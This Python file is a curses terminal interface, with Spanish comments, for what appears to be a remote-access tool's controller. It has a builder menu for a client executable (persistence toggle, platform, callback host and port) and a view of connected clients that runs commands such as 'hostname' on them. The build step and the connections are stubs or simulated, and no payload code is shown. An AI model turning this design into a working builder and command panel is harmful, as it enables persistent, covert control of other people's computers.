import curses
import argparse
import socket
import threading
from typing import Union
from client import Client
from server import Server


# Manejo de las funciones del servidor
def run_server(server):
    server.start()
    print("[+] Servidor escuchando...")


def create_executable(stdscr):
    curses.curs_set(1)  # Mostrar el cursor
    stdscr.clear()

    # Variables para las selecciones
    persistence_option = False
    platforms = ["Windows", "Linux", "macOS"]
    current_platform = 0
    host = ""
    port = ""
    current_option = 0  # Opción actual seleccionada

    # Colores adicionales para mejorar la interfaz
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)  # Para opciones activas
    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLUE)   # Para el campo seleccionado
    curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK) # Para instrucciones

    while True:
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        start_y = height // 2 - 8  # Ajustado para mejor distribución
        start_x = width // 2 - 25  # Centro horizontal

        # Título y marco
        stdscr.addstr(start_y, start_x, "╔══════════════ Crear Ejecutable ══════════════╗", curses.A_BOLD)
        stdscr.addstr(start_y + 14, start_x, "╚════════════════════════════════════════════╝", curses.A_BOLD)

        # Instrucciones de navegación
        instructions = "↑↓: Navegar | Enter: Seleccionar | Esc: Salir"
        stdscr.addstr(start_y - 2, width // 2 - len(instructions) // 2, instructions, curses.color_pair(4))

        # 1. Opción de persistencia
        field_text = "Persistencia:"
        stdscr.addstr(start_y + 2, start_x + 2, field_text)
        if current_option == 0:
            stdscr.addstr(start_y + 2, start_x + len(field_text) + 3, "Sí" if persistence_option else "No",
                         curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 2, start_x + len(field_text) + 3, "Sí" if persistence_option else "No",
                         curses.color_pair(2))

        # 2. Selector de plataforma
        stdscr.addstr(start_y + 4, start_x + 2, "Plataforma:")
        platform_x = start_x + 13
        for idx, platform in enumerate(platforms):
            if current_option == 1 and idx == current_platform:
                stdscr.addstr(start_y + 4, platform_x + idx * 12, f"[{platform}]",
                            curses.color_pair(3) | curses.A_BOLD)
            else:
                stdscr.addstr(start_y + 4, platform_x + idx * 12, f" {platform} ",
                            curses.color_pair(2) if idx == current_platform else curses.A_NORMAL)

        # 3. Campo de host
        field_text = "Host:"
        stdscr.addstr(start_y + 6, start_x + 2, field_text)
        if current_option == 2:
            stdscr.addstr(start_y + 6, start_x + len(field_text) + 3, f"[{host}]",
                         curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 6, start_x + len(field_text) + 3, host,
                         curses.color_pair(2))

        # 4. Campo de puerto
        field_text = "Puerto:"
        stdscr.addstr(start_y + 8, start_x + 2, field_text)
        if current_option == 3:
            stdscr.addstr(start_y + 8, start_x + len(field_text) + 3, f"[{port}]",
                         curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 8, start_x + len(field_text) + 3, port,
                         curses.color_pair(2))

        # Botón de confirmación
        button_text = "[ Confirmar ]"
        if current_option == 4:
            stdscr.addstr(start_y + 11, width // 2 - len(button_text) // 2, button_text,
                         curses.color_pair(3) | curses.A_BOLD)
        else:
            stdscr.addstr(start_y + 11, width // 2 - len(button_text) // 2, button_text,
                         curses.color_pair(2))

        # Campo activo actual
        active_field = ["Persistencia", "Plataforma", "Host", "Puerto", "Confirmar"][current_option]
        status_text = f"Campo activo: {active_field}"
        stdscr.addstr(height - 2, width // 2 - len(status_text) // 2, status_text, curses.color_pair(4))

        stdscr.refresh()

        key = stdscr.getch()

        if key == 27:  # Esc
            break
        elif key == curses.KEY_DOWN:
            current_option = (current_option + 1) % 5
        elif key == curses.KEY_UP:
            current_option = (current_option - 1) % 5
        elif key == curses.KEY_RIGHT:
            if current_option == 1:  # Plataforma
                current_platform = (current_platform + 1) % len(platforms)
            elif current_option == 0:  # Persistencia
                persistence_option = not persistence_option
        elif key == curses.KEY_LEFT:
            if current_option == 1:  # Plataforma
                current_platform = (current_platform - 1) % len(platforms)
            elif current_option == 0:  # Persistencia
                persistence_option = not persistence_option
        elif key in [10, 13]:  # Enter
            if current_option == 4:  # Botón confirmar
                if host and port:  # Validación básica
                    stdscr.addstr(start_y + 12, start_x + 2, "✓ Ejecutable creado con éxito!",
                                curses.color_pair(2) | curses.A_BOLD)
                    stdscr.refresh()
                    curses.napms(1500)
                    break
                else:
                    error_msg = "⚠ Error: Host y Puerto son requeridos"
                    stdscr.addstr(start_y + 12, start_x + 2, error_msg,
                                curses.color_pair(1) | curses.A_BOLD)
                    stdscr.refresh()
                    curses.napms(1500)
        elif current_option == 2 and (32 <= key <= 126):  # Host
            host += chr(key)
        elif current_option == 3 and len(port) < 5 and 48 <= key <= 57:  # Puerto
            port += chr(key)
        elif key in [curses.KEY_BACKSPACE, 127, 8]:  # Backspace
            if current_option == 2:
                host = host[:-1]
            elif current_option == 3:
                port = port[:-1]

    curses.curs_set(0)


def show_connections(stdscr, server):
    connected_clients =  [Client("127.0.0.1", server.port) for _ in range(10)]
    total_connections = len(connected_clients)
    current_row = 0
    current_column = 0
    page_size = 9  # Mostramos 3 filas por columna (3 columnas x 3 filas)
    current_page = 0
    total_pages = (total_connections + page_size - 1) // page_size

    while True:
        stdscr.clear()

        # Centrando el título
        title = "Conexiones activas:"
        title_x = stdscr.getmaxyx()[1] // 2 - len(title) // 2
        show_message(stdscr, title, 1, title_x)

        # Mostrar clientes en la página actual
        start_index = current_page * page_size
        for idx in range(page_size):
            actual_index = start_index + idx
            if actual_index < total_connections:
                name = connected_clients[actual_index].execute_command('hostname')
                ip = connected_clients[actual_index].client_socket.getsockname()[0] if isinstance(
                    connected_clients[actual_index].client_socket, socket.socket) else connected_clients[actual_index].client_socket

                # Calcular posición para cada cliente en filas y columnas
                row = idx // 3  # Filas por cada página
                column = idx % 3  # Columnas por cada página
                y, x = get_display_position(stdscr, row, column)
                display_text = f"{actual_index + 1}. {name} ({ip})"
                show_client_row(stdscr, y, x, display_text, current_row == row and current_column == column)
            else:
                row = idx // 3  # Filas por cada página
                column = idx % 3  # Columnas por cada página
                y, x = get_display_position(stdscr, row, column)
                display_text = "Vacio"
                show_client_row(stdscr, y, x, display_text, current_row == row and current_column == column)
        # Información de paginación centrada
        pagination_info = f"Página {current_page + 1} de {total_pages}"
        pagination_x = stdscr.getmaxyx()[1] // 2 - len(pagination_info) // 2
        show_message(stdscr, pagination_info, stdscr.getmaxyx()[0] - 2, pagination_x)

        stdscr.refresh()

        # Navegación
        result = navigate_client_list(stdscr, connected_clients, page_size, current_row, current_column, current_page, total_pages)
        if result == "quit":
            break
        elif isinstance(result, tuple):
            current_row, current_column, current_page = result
        else:
            selected_client: Client = result
            if selected_client and isinstance(selected_client, Client):
                stdscr.clear()
                show_message(stdscr, f"Cliente seleccionado: {selected_client}", 0, 0)
                selected_client.display_commands(stdscr)
                stdscr.refresh()
                stdscr.getch()


def get_display_position(stdscr, row, column):
    """Calcula la posición de cada cliente en una fila y columna específica, con tres columnas centradas."""
    y = stdscr.getmaxyx()[0] // 2 - 5 + row * 2  # Centrado verticalmente
    x_positions = [
        stdscr.getmaxyx()[1] // 2 - 30,  # Columna izquierda
        stdscr.getmaxyx()[1] // 2 - 5,   # Columna central
        stdscr.getmaxyx()[1] // 2 + 20   # Columna derecha
    ]
    x = x_positions[column]
    return y, x



def show_message(stdscr, message, y, x):
    stdscr.addstr(y, x, message)
    stdscr.refresh()


def show_client_row(stdscr, y, x, display_text, highlighted):
    if highlighted:
        stdscr.attron(curses.color_pair(1))
        stdscr.addstr(y, x, display_text)
        stdscr.attroff(curses.color_pair(1))
    else:
        stdscr.addstr(y, x, display_text)





def navigate_client_list(stdscr, connected_clients, page_size, current_row, current_column, current_page, total_pages):
    total_connections = len(connected_clients)
    key = stdscr.getch()

    if key == curses.KEY_DOWN:
        if current_row < 2 and (current_page * page_size + (current_row + 1) * 3 + current_column) < total_connections:
            current_row += 1
        elif current_page < total_pages - 1:
            current_page += 1
            current_row = 0

    elif key == curses.KEY_UP:
        if current_row > 0:
            current_row -= 1
        elif current_page > 0:
            current_page -= 1
            current_row = 2

    elif key == curses.KEY_RIGHT:
        if current_column < 2 and (current_page * page_size + current_row * 3 + (current_column + 1)) < total_connections:
            current_column += 1
        elif current_page < total_pages - 1:
                current_page += 1
                current_row, current_column = 0, 0

    elif key == curses.KEY_LEFT:
        if current_column > 0:
            current_column -= 1
        elif current_page > 0:
            current_page -= 1
            current_row, current_column = 2, 2

    elif key in [10, 13]:  # Enter key
        selected_client = select_client(connected_clients, current_row, current_column, current_page, page_size)
        if selected_client:
            return selected_client

    elif key == ord("q"):
        return "quit"

    return current_row, current_column, current_page


def select_client(connected_clients, current_row, current_column, current_page, page_size):
    """Selecciona un cliente según la fila, columna y página actuales."""
    selected_index = current_page * page_size + current_row * 3 + current_column
    if selected_index < len(connected_clients):
        return connected_clients[selected_index]
    return None

# Funciones para inicializar y mostrar los menús
def show_logo(stdscr, logo):
    for i, line in enumerate(logo):
        x = stdscr.getmaxyx()[1] // 2 - len(line) // 2
        stdscr.addstr(i + 5, x, line, curses.A_BOLD)


def menu_init(stdscr, logo, menu, current_row):
    stdscr.clear()
    show_logo(stdscr, logo)
    for idx, row in enumerate(menu):
        x = stdscr.getmaxyx()[1] // 2 - len(row) // 2
        y = stdscr.getmaxyx()[0] // 2 - len(menu) // 2 + idx
        if idx == current_row:
            stdscr.attron(curses.color_pair(1))
            stdscr.addstr(y, x, row)
            stdscr.attroff(curses.color_pair(1))
        else:
            stdscr.addstr(y, x, row)
    stdscr.refresh()


def handle_key_navigation(key, current_row, num_options):
    """Maneja la navegación en el menú según la tecla presionada."""
    if key == curses.KEY_UP:
        current_row = (current_row - 1) % num_options
    elif key == curses.KEY_DOWN:
        current_row = (current_row + 1) % num_options
    return current_row


def main_menu(stdscr, server):
    menu = ["CREAR EJECUTABLE", "VER CONEXIONES", "SALIR"]
    current_row = 0
    logo = ["T I T U L O ", "-------------------"]
    while True:
        menu_init(stdscr, logo, menu, current_row)
        key = stdscr.getch()
        if key == ord("q"):
            exit(0)
        current_row = handle_key_navigation(key, current_row, len(menu))
        if key in (curses.KEY_ENTER, 10, 13):  # Enter presionado, Ejecuta la opción seleccionada
            if menu[current_row] == "CREAR EJECUTABLE":
                create_executable(stdscr)
            elif menu[current_row] == "VER CONEXIONES":
                show_connections(stdscr, server)
            elif menu[current_row] == "SALIR":
                break


def main(stdscr):
    parser = argparse.ArgumentParser(description="Servidor Simulado")
    parser.add_argument('--create', action='store_true', help='Crear un ejecutable al inicio')
    parser.add_argument('--view', action='store_true', help='Ver las conexiones al inicio')
    args = parser.parse_args()
    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)
    server = Server()
    threading.Thread(target=run_server, args=(server,), daemon=True).start()
    if args.create:
        create_executable(stdscr)
    elif args.view:
        show_connections(stdscr, server)
    else:
        main_menu(stdscr, server)


if __name__ == "__main__":
    curses.wrapper(main)